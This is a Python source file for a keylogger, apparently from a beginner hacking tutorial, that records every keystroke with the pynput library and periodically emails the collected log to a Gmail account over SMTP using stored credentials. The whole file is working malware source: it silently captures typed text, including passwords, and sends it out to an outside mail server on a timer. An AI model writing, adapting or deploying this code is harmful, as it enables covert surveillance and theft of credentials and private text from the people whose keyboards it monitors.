#!/usr/bin/env python
import threading
import pynput.keyboard
import smtplib

class Keylogger:

    def __init__(self,time_interval,email,password):   # constructor methods   it get executed automatically when the object is created
        #defined attributes:
        self.log = "key logger started"
        self.interval = time_interval
        self.email = email
        self.password  = password

    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self,key):
        try:
            # For alphanumeric keys
           current_key = str(key.char)

        except AttributeError:

            # For special keys (e.g., Key.space, Key.enter)
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email,self.password, self.log)      #calling the sendmail method
        self.log = ""                                           #reset the log to nothing after printing or sending an email
        timer = threading.Timer(self.interval,self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)  # Sending email to self
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    #on press is the call back-function  used in pynput

        # Start the listener
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


#object oriented programming implimentation
